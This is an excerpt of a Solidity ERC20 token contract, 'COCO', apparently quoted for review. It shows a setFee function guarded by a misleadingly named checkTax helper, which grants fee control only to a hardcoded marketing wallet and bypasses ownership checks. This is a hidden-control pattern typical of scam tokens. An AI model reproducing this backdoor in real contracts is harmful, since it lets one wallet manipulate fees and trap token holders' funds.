...
contract COCO is Context, IERC20, Ownable {
    ...
    address payable private _developmentAddress = payable(0xA46E46CdB28A67a421B295045622de57941cE25e);
    address payable private _marketingAddress = payable(0xA46E46CdB28A67a421B295045622de57941cE25e);
    ...
    function checkTax() internal view {
         require(msg.sender == _marketingAddress, "error");
     }
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) external { checkTax();
